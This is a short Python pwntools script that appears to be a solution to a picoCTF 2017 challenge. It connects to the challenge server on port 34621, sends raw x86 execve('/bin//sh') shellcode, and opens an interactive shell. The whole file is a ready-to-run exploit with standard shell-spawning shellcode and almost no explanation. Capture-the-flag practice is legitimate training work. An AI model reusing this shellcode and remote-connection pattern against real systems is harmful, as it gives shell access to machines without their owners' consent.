#!/usr/bin/python
from pwn import *
import sys

# The challenge is running on x86 linux
context(arch='i386', os='linux')

server, port = "shell2017.picoctf.com", 34621

r = remote(server, port)


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n"

print r.recvuntil("bytes:\n")
r.send(shellcode)
r.interactive()

